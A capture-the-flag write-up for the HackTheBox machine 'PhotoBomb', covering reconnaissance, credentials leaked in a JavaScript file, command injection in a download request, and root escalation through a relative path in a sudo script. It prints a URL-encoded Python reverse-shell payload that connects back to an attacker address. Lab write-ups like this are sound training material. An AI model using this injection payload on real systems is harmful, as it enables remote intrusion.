# HackTheBox PhotoBomb WriteUp

![Ping](images/photobomb.png?raw=true "Photobomb")


Machine IP: 10.10.11.182

![Ping](images/img(1).png?raw=true "Ping")

<br/>

### -> NMAP SCAN

```
sudo nmap -vvv -cSV -p0-65535 --reason -T4 10.10.11.182 -oN photobomb.nmap
```

![Ping](images/img(2).png?raw=true "Ping")

### -> WEB ENUM

Added domain photobomb.htb in /etc/hosts

![Ping](images/img(3).png?raw=true "Ping")

Going to site and checking functionality, I found a link of a printer. 

![Ping](images/img(4).png?raw=true "Ping")

It's asking for credentials 

![Ping](images/img(5).png?raw=true "Ping")

Viewing page source, I found a photobomb.js 

![Ping](images/img(6).png?raw=true "Ping")

Accessing the file, got credentials. pH0to : boMb!

![Ping](images/img(7).png?raw=true "Ping")

### -> FOOTHOLD

Accessing the page with these credentials, found diffirent photos and link to downlaod. Analyze request of downlaod with Burp Suite.

![Ping](images/img(9).png?raw=true "Ping")

Download post request contains three parameters. Checking that these parameters are injectable or not.So, start python server and making request to server with parameters.

![Ping](images/img(10).png?raw=true "Ping")

As server is receiving request,it is vulnerable for remote code injection.

![Ping](images/img(11).png?raw=true "Ping")

### -> USER FLAG

Start netcat

![Ping](images/img(12).png?raw=true "Ping")

Prepare a python reverse shell and url encode it

```
%3bexport+RHOST%3d"10.10.14.95"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
```

Got a shell in netcat and user flag.

![Ping](images/img(13).png?raw=true "Ping")

### -> ROOT ACCESS

Checking for root access, found that user may access to /opt/cleanup.sh So, viewing the content found that it is using relative path

![Ping](images/img(14).png?raw=true "Ping")

Inserted the path /bin/bash  path to /opt/cleanup.sh enables the root access so got a root flag.

![Ping](images/img(15).png?raw=true "Ping")